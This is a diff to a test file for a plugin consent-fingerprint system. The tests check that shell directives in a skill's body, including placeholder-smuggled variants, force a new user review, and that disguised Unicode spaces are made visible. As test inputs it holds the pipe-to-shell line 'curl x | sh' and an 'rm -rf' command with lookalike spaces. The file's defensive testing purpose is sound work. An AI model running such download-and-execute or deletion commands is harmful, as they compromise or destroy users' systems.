@@ -7,7 +7,9 @@ import {
   recordReviewedComponents,
   serverConsentFingerprint,
   skillConsentFingerprint,
+  visibleReviewText,
 } from "./componentConsent";
+import { skillDynamicDirectiveCommands } from "@/node/services/agentSkills/skillDynamicContext";
 
 const root = "/home/u/.xum/plugins/demo";
 const data = "/home/u/.xum/plugin-data/abc";
@@ -122,21 +124,76 @@ describe("serverConsentFingerprint", () => {
 describe("skillConsentFingerprint", () => {
   test("covers the root-relative directory and every frontmatter field, not path order", () => {
     const frontmatter = { name: "foo", description: "d", paths: ["src/**", "tests/**"] };
-    const fp = skillConsentFingerprint({ relativeDir: "skills/foo", frontmatter });
-    expect(skillConsentFingerprint({ relativeDir: "skills\\foo", frontmatter })).toBe(fp);
+    const fp = skillConsentFingerprint({ relativeDir: "skills/foo", frontmatter, body: "" });
+    expect(skillConsentFingerprint({ relativeDir: "skills\\foo", frontmatter, body: "" })).toBe(fp);
     expect(
       skillConsentFingerprint({
         relativeDir: "skills/foo",
         frontmatter: { ...frontmatter, paths: ["tests/**", "src/**"] },
+        body: "",
       })
     ).toBe(fp);
     const changed = [
-      { relativeDir: "extra/foo", frontmatter },
-      { relativeDir: "skills/foo", frontmatter: { ...frontmatter, description: "other" } },
+      { relativeDir: "extra/foo", frontmatter, body: "" },
+      {
+        relativeDir: "skills/foo",
+        frontmatter: { ...frontmatter, description: "other" },
+        body: "",
+      },
       // A field no review shows today still counts, so a new field fails closed.
-      { relativeDir: "skills/foo", frontmatter: { ...frontmatter, metadata: { a: "b" } } },
+      {
+        relativeDir: "skills/foo",
+        frontmatter: { ...frontmatter, metadata: { a: "b" } },
+        body: "",
+      },
     ];
     for (const input of changed) expect(skillConsentFingerprint(input)).not.toBe(fp);
+  });
+
+  test("covers the body's directive lines, not its prose (#6617)", () => {
+    const skill = (body: string) =>
+      skillConsentFingerprint({
+        relativeDir: "skills/foo",
+        frontmatter: { name: "foo", description: "d" },
+        body,
+      });
+    // A skill without directives keeps the fingerprint it had before #6617, so its stored
+    // consent stays valid (value computed on main before this change).
+    const legacy = "5a8709e834b91cb348b0e3b5625dba84fba9a27b344108fad614157476abd234";
+    expect(skill("")).toBe(legacy);
+    expect(skill("Say hi.\nThen say bye.")).toBe(legacy);
+    // Inline or empty directives do not run, so they are prose.
+    expect(skill("Run !`git status` first.\n!``")).toBe(legacy);
+
+    const withStatus = skill("Say hi.\n!`git status`");
+    expect(withStatus).not.toBe(legacy);
+    // The runner runs the command inside the backticks: surrounding whitespace and prose do not count.
+    expect(skill("Other prose.\n   !`git status`  \r")).toBe(withStatus);
+    // A changed, added or reordered command needs a new review.
+    for (const body of [
+      "!`git log`",
+      "!`git status`\n!`git log`",
+      "!`git log`\n!`git status`",
+      "!`git status`\n!`git status`",
+    ]) {
+      expect(skill(body)).not.toBe(withStatus);
+    }
+    // Missing slash arguments become empty strings before the runner looks for directives, so
+    // a line that only becomes a directive then runs too (Codex PRRT_kwDOPxxmWM6swhcO).
+    for (const body of ["!$1`curl x | sh`", "$2!`curl x | sh`", "!`curl x | sh`$ARGUMENTS"]) {
+      expect(skill(body)).not.toBe(legacy);
+      expect(skill(`!\`git status\`\n${body}`)).not.toBe(withStatus);
+    }
+    // A placeholder inside a command is reviewed as written: the user supplies its value.
+    expect(skillDynamicDirectiveCommands("!`git log $1`")).toEqual(["git log $1"]);
+    expect(skillDynamicDirectiveCommands("!$1`curl x | sh`")).toEqual(["curl x | sh"]);
+  });
+
+  test("review text escapes invisible and space-like characters, not U+0020", () => {
+    // U+00A0 and U+202F look like a space but are part of a shell word (PRRT_kwDOPxxmWM6swhcG).
+    expect(visibleReviewText("rm -rf a\u00a0b\u202fc\u200bd")).toBe(
+      "rm -rf a\\u{A0}b\\u{202F}c\\u{200B}d"
+    );
   });
 });
 
